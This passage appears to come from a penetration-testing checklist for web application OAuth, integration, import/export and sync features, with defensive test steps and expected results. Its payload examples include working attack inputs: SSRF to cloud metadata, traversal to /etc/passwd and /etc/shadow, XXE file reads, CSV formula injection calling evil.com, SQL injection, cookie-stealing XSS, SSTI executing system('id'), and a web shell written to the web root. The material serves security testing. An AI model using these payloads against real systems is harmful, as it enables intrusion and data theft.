**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-035 — OAuth Token Reuse After Revocation
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Obtain an OAuth access token. 2. Revoke the token through the management interface. 3. Attempt to use the revoked token for API calls. 4. Check if revoked tokens are still accepted.

**Expected Result:** Application must immediately invalidate revoked OAuth tokens and reject all subsequent requests using them.

**Payload Example:**

```
Use revoked access_token in Authorization: Bearer REVOKED_TOKEN for authenticated API endpoints
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-036 — OAuth Implicit Flow Token Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Check if OAuth implicit flow is supported. 2. If so verify access token exposure in URL fragment. 3. Check browser history for token. 4. Test for token leakage via Referer.

**Expected Result:** Application should use authorization code flow with PKCE instead of implicit flow and should not expose tokens in URL fragments.

**Payload Example:**

```
Check for access_token in URL fragment #access_token=TOKEN_VALUE;verify token in browser history
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-037 — OAuth App Impersonation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Register an OAuth app with a name similar to a legitimate app. 2. Use the same logo and description. 3. Check if users can distinguish between legitimate and impersonating apps. 4. Test consent screen.

**Expected Result:** Application must implement app verification and display clear identifying information on consent screens to prevent impersonation.

**Payload Example:**

```
Register app named "Offical Target App" (typosquatting) with similar branding to legitimate app
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Manual Testing;Browser

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-038 — OAuth Refresh Token Rotation Failure
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Obtain a refresh token. 2. Use it to get a new access token. 3. Use the same refresh token again. 4. Check if the old refresh token is invalidated after use.

**Expected Result:** Application must implement refresh token rotation invalidating old refresh tokens after each use to prevent token theft exploitation.

**Payload Example:**

```
Use same refresh_token twice in POST /oauth/token and check if both succeed
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-039 — OAuth PKCE Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Check if PKCE is required for public clients. 2. Initiate authorization without code_challenge. 3. Exchange authorization code without code_verifier. 4. Check if flow completes without PKCE.

**Expected Result:** Application must enforce PKCE for all public OAuth clients and reject authorization requests without valid code_challenge.

**Payload Example:**

```
Remove code_challenge from authorization request;remove code_verifier from token exchange request
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-040 — Third-party API Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Search client-side code for third-party API keys. 2. Check for keys for services like Stripe or Twilio or AWS or Google. 3. Test if exposed keys allow unauthorized access. 4. Check git history.

**Expected Result:** Application must keep all third-party API keys server-side and never expose them in client-accessible code or version control.

**Payload Example:**

```
Search JS for sk_live_;AKIA;AIzaSy;twilio_auth;nexmo_key;sendgrid_api;mailgun_key in source and git history
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-041 — Third-party Integration SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify integration configuration endpoints that accept URLs. 2. Set URLs to internal network addresses. 3. Trigger the integration. 4. Monitor for internal network access.

**Expected Result:** Application must validate all third-party integration URLs against allowlists and block access to internal network resources.

**Payload Example:**

```
integration_url=http://169.254.169.254/latest/meta-data/;service_endpoint=http://localhost:8080/admin;callback=http://10.0.0.1:22/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-042 — Third-party Integration Data Leakage
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Configure a third-party integration. 2. Monitor data sent to the third-party service. 3. Check if excessive or sensitive data is shared. 4. Verify data minimization practices.

**Expected Result:** Application must share only the minimum necessary data with third-party integrations and inform users about data sharing.

**Payload Example:**

```
Monitor outgoing requests for full_user_profile;payment_details;password_hashes;internal_ids sent to third-party APIs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Wireshark;mitmproxy

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-043 — Third-party Integration Authentication Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify authentication mechanisms for third-party integrations. 2. Remove or modify authentication headers in integration requests. 3. Check if integration endpoints accept unauthenticated requests.

**Expected Result:** Application must require and validate authentication for all third-party integration endpoints.

**Payload Example:**

```
Remove Authorization header from GET /api/integrations/data;modify integration API key to empty value
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-044 — Third-party Integration Injection via Shared Data
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify data shared with third-party integrations. 2. Insert injection payloads in shared data fields. 3. Check if payloads are executed by the third-party system. 4. Test for SQL injection and XSS.

**Expected Result:** Application must sanitize all data sent to third-party integrations to prevent injection attacks on downstream systems.

**Payload Example:**

```
Set customer_name=<script>alert(1)</script> or product_desc=' OR 1=1-- in data synchronized to third-party CRM
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-045 — Third-party Integration Configuration IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. View own integration configuration. 2. Change integration_id or account_id to another user's. 3. Check if other users' integration credentials and configurations are exposed.

**Expected Result:** Application must verify ownership before displaying or modifying any third-party integration configuration.

**Payload Example:**

```
GET /api/integrations/INT-2001;PUT /api/integrations/INT-2001/config with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-046 — Insecure Third-party SDK Version
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify all third-party SDKs and libraries used. 2. Check versions against known vulnerability databases. 3. Verify if security patches are applied. 4. Check for deprecated SDK usage.

**Expected Result:** Application must use up-to-date versions of all third-party SDKs and libraries and promptly apply security patches.

**Payload Example:**

```
Check package.json;requirements.txt;Gemfile for outdated libraries;cross-reference with CVE databases
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** OWASP Dependency-Check;Snyk;npm audit;retire.js

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-047 — Third-party OAuth Token Hijacking
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Check if third-party OAuth tokens are stored securely. 2. Attempt to access stored tokens via API. 3. Check for token exposure in logs or error messages. 4. Verify token encryption.

**Expected Result:** Application must encrypt third-party OAuth tokens at rest and never expose them in API responses or logs.

**Payload Example:**

```
Check GET /api/integrations/INT-1001 for stored_access_token;oauth_token;refresh_token in response
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-048 — Third-party Integration Callback Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Third-party Integrations

**Test Steps:** 1. Identify integration callback endpoints. 2. Spoof callback requests from third-party services. 3. Modify callback data to trigger unauthorized actions. 4. Check for callback authentication.

**Expected Result:** Application must verify the authenticity of all integration callbacks through signatures or shared secrets and validate callback data.

**Payload Example:**

```
POST /api/integrations/callback with spoofed payload and forged signature;modify callback data values
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-049 — Import File Path Traversal
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Use the data import feature. 2. If file path is a parameter attempt directory traversal. 3. Try to read or include arbitrary server files. 4. Test with encoded traversal sequences.

**Expected Result:** Application must validate import file paths strictly and prevent directory traversal in import functionality.

**Payload Example:**

```
import_file=../../../etc/passwd;file=....//....//etc/shadow;path=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## INTG-050 — Malicious File Upload via Import
**Test Category:** File Upload (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Use the import feature to upload files. 2. Upload web shells disguised as CSV or XML or JSON files. 3. Upload files with double extensions. 4. Check file type validation by content not extension.

**Expected Result:** Application must validate imported files by content type and scan for malicious content and process imports in sandboxed environments.

**Payload Example:**

```
Upload shell.php.csv;import.xml with XXE;data.csv containing formula injection =cmd|'/C calc'!A0
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite;Custom Scripts;ClamAV

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## INTG-051 — XXE via XML Import
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. If import accepts XML files create an XML file with XXE payload. 2. Upload the malicious XML. 3. Check if external entities are resolved. 4. Test for blind XXE using out-of-band techniques.

**Expected Result:** Application must disable external entity processing in all XML parsers used for data import.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data><item>&xxe;</item></data>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## INTG-052 — CSV Injection via Import
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Import a CSV file containing formula payloads. 2. Export the data later. 3. Open the exported file in a spreadsheet application. 4. Check if formulas execute in the spreadsheet.

**Expected Result:** Application must sanitize CSV data on import by escaping formula-triggering characters and on export by prefixing cells with single quotes.

**Payload Example:**

```
CSV content: =cmd|'/C calc'!A0;+cmd|'/C calc'!A0;-cmd|'/C calc'!A0;@SUM(1+1)*cmd|'/C calc'!A0;=HYPERLINK("https://evil.com")
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-053 — Export IDOR for Data Exfiltration
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Export own data. 2. Intercept the export request and change user_id or account_id. 3. Check if another user's data is included in the export. 4. Try exporting all users' data.

**Expected Result:** Application must verify that the authenticated user can only export their own data and enforce authorization on every export request.

**Payload Example:**

```
Change GET /api/export?user_id=1001 to user_id=1002;try GET /api/export?scope=all;GET /api/admin/export with regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-054 — Export Data Excessive Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Export data and examine the file contents. 2. Check for sensitive fields like passwords or internal IDs or payment details. 3. Verify data minimization in exports.

**Expected Result:** Application must exclude sensitive data from exports and only include data appropriate for the user's authorization level.

**Payload Example:**

```
Check exported CSV/JSON for password_hash;ssn;full_card_number;internal_notes;admin_comments
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-055 — Denial of Service via Large Import File
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Create an extremely large import file with millions of records. 2. Upload the file for import. 3. Monitor server performance. 4. Check for file size limits and processing timeouts.

**Expected Result:** Application must enforce file size limits and record count limits on imports and process large imports asynchronously with resource controls.

**Payload Example:**

```
Upload 1GB CSV file;import file with 10 million records;upload zip bomb disguised as import archive
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Scripts;JMeter

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## INTG-056 — Import SQL Injection via Data Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Create an import file with SQL injection payloads in data fields. 2. Import the file. 3. Check if SQL payloads are executed during the import processing.

**Expected Result:** Application must use parameterized queries when inserting imported data and sanitize all imported field values.

**Payload Example:**

```
CSV: name;email with row "' OR 1=1--";test@test.com' UNION SELECT password FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-057 — Export Path Traversal via Filename Parameter
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Trigger data export. 2. If the export filename is a parameter modify it to traverse directories. 3. Attempt to write the export to arbitrary locations.

**Expected Result:** Application must sanitize export filenames and restrict export file locations to designated directories.

**Payload Example:**

```
export_filename=../../../var/www/html/shell.php;filename=....//....//etc/cron.d/evil
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## INTG-058 — Import Data XSS via Stored Content
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Create an import file with XSS payloads in data fields. 2. Import the file. 3. View the imported data in the application interface. 4. Check if stored XSS executes.

**Expected Result:** Application must sanitize all imported data before storage and encode output when rendering imported content.

**Payload Example:**

```
CSV with name=<script>alert(document.cookie)</script>;description=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## INTG-059 — Export File Access Without Authentication
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Trigger a data export and capture the download URL. 2. Open the URL in an incognito browser without authentication. 3. Check if the export file is publicly accessible.

**Expected Result:** Application must require authentication for export file access and use signed time-limited download URLs.

**Payload Example:**

```
Access export download URL https://target.com/exports/data-1001.csv directly without authentication
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser;Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-060 — Import Deserialization Vulnerability
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. If import processes serialized data check for insecure deserialization. 2. Inject malicious serialized objects in import files. 3. Check for remote code execution.

**Expected Result:** Application must avoid deserializing untrusted import data and validate all deserialized objects against expected types.

**Payload Example:**

```
Inject serialized Java/PHP/Python objects in import files;use ysoserial payloads in serialized import data
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** Burp Suite;ysoserial

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## INTG-061 — SSTI in Import Template Processing
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. If imports use templates or the import data is rendered through templates inject SSTI payloads. 2. Import the file. 3. Check if template expressions are evaluated.

**Expected Result:** Application must treat imported data as plain text and never process it through template engines.

**Payload Example:**

```
CSV with name={{7*7}};description=${7*7};field=<%= system('id') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## INTG-062 — Race Condition on Concurrent Imports
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Import / Export Data

**Test Steps:** 1. Trigger multiple simultaneous import operations. 2. Import conflicting data concurrently. 3. Check for data corruption or race conditions. 4. Verify data integrity after concurrent imports.

**Expected Result:** Application must handle concurrent imports safely with proper locking to prevent data corruption or duplicate records.

**Payload Example:**

```
Upload same import file simultaneously from multiple sessions;import conflicting data concurrently
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## INTG-063 — Sync Authentication Token Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Configure sync with an external system. 2. Inspect API requests and responses for sync authentication tokens. 3. Check if tokens are stored securely. 4. Verify token encryption at rest.

**Expected Result:** Application must encrypt sync authentication tokens at rest and in transit and never expose them in client-accessible responses.

**Payload Example:**

```
Check GET /api/sync/config for sync_token;external_api_key;access_token;service_password in response body
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-064 — Sync Data Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Identify data synced from external systems. 2. Inject malicious payloads in the external system data. 3. Trigger sync. 4. Check if injected data causes vulnerabilities in the application.

**Expected Result:** Application must validate and sanitize all data received from external systems during sync operations.

**Payload Example:**

```
Insert <script>alert(1)</script> or ' OR 1=1-- in external system data fields then trigger sync
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-065 — Sync IDOR for Cross-Account Data
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Configure sync for own account. 2. Modify sync_account_id or connection_id to target another user's external connection. 3. Trigger sync. 4. Check if data from another user's external system is synced.

**Expected Result:** Application must verify ownership of sync configurations before processing and prevent cross-account sync operations.

**Payload Example:**

```
Change POST /api/sync/trigger with connection_id=CONN-1001 to connection_id=CONN-2001
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-066 — Sync Callback SSRF
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. If sync uses callback URLs for status updates intercept and modify the callback URL. 2. Set to internal service addresses. 3. Check for SSRF through sync callbacks.

**Expected Result:** Application must validate sync callback URLs against allowlists and block internal network access.

**Payload Example:**

```
sync_callback=http://169.254.169.254/latest/meta-data/;status_url=http://localhost:6379/;callback=http://10.0.0.1:22/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-067 — Sync Conflict Resolution Manipulation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Create conflicting data between local and external systems. 2. Trigger sync. 3. Manipulate conflict resolution parameters to favor attacker's data. 4. Check if resolution rules can be bypassed.

**Expected Result:** Application must implement secure conflict resolution rules server-side and not allow client manipulation of resolution priorities.

**Payload Example:**

```
Change conflict_resolution=remote_wins to conflict_resolution=local_wins;modify priority or timestamp in sync request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-068 — Sync Frequency Manipulation for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Configure sync frequency. 2. Modify the sync_interval to very small value. 3. Check if continuous syncing causes resource exhaustion. 4. Test for rate limiting on sync triggers.

**Expected Result:** Application must enforce minimum sync intervals server-side and rate limit manual sync triggers to prevent resource exhaustion.

**Payload Example:**

```
Change sync_interval=3600 to sync_interval=1 (every second);send 1000+ POST /api/sync/trigger requests
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## INTG-069 — External System Credential Harvesting
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Sync with External Systems

**Test Steps:** 1. Configure sync with external system credentials. 2. Intercept the sync configuration request. 3. Check if credentials are transmitted securely. 4. Verify credentials are not logged.

**Expected Result:** Application must transmit external system credentials only over HTTPS and store them encrypted at rest without logging.

**Payload Example:**

```
Check for external_password;api_secret;auth_token in plain text in request body;check server logs for credentials
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Wireshark

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-070 — Sync Data Tampering in Transit
**Test Category:** Cryptography (WSTG-CRYP-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Sync with External Systems

